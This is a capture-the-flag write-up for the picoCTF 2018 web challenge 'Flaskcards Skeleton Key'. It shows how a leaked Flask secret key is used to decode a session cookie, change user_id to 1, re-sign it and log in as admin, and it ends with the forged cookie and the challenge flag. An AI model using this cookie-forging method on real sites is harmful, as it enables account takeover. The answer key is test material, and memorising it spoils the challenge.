# Flaskcards Skeleton Key
Web Exploitation - 600 points

## Challenge 
> Nice! You found out they were sending the Secret_key: 06f4eefabf03b8f4e521fbdada13f65c. Now, can you find a way to log in as admin? http://2018shell2.picoctf.com:5953 (link).

## Hint
> What can you do with a flask Secret_Key?

> The database still reverts every 2 hours

## Solution

With the Flask secret_key, we are able to decode and re-encode the session cookie:

- https://stackoverflow.com/a/27287455
- https://stackoverflow.com/questions/22463939/demystify-flask-app-secret-key?lq=1
- https://terryvogelsang.tech/MITRECTF2018-my-flask-app/


---

Using this [Github Gist by @aescalana](https://gist.github.com/aescalana/7e0bc39b95baa334074707f73bc64bfe), I could *decode and modify the session cookie*

	secret = "06f4eefabf03b8f4e521fbdada13f65c"
	cookie = "xxx"
	session = decodeFlaskCookie(secret, cookie)

	//////

	Decoded cookie: {u'csrf_token': u'10d3d30c07d13b0af26f8b4631f384ceb385bd65', u'_fresh': True, u'user_id': u'18', u'_id': u'e01741f0b1c3c9f8a0ec50f16c6da2ca1c1fd464824b3ac67ce0c3984591af3e5b7fd2a843c16a7299755c34e3b582429336fb0ebf292250ec1dfc74800112bc'}

And then I assumed that the user_id of 1 will mean the admin, so I changed it accordingly and created a new cookie

	session['user_id'] = u'1'
	cookie = encodeFlaskCookie(secret, session)
	print 'New cookie', cookie

	//////

	New cookie: .eJwlj0uqAkEMAO_Saxf59sfLDJ10giIozOjq8e7ugAeoouqvbLnHcSvX9_6JS9nuq1xLADbBBENnH9knhCskVq9rkk90zCVVOonx9No8wHl00YEzOdRaLppd2LHORmM0VWcJNj0ZGsw1DcKSBpGedlzpTToAIpmXS_Fjz-39esTz7EFYvBgc2kI2mEk1u0llTO7iYdzVVtWT-xyx_yaw_H8Bqvo-tA.Dps_AQ.AswNhwnYrLZMPD3HNeWFF5POoK4

Use Chrome EditThisCookie extension to modify the session cookie. Reload the page and we are now Admin!

## Flag

	Welcome Admin
	Your flag is: picoCTF{1_id_to_rule_them_all_1879a381}
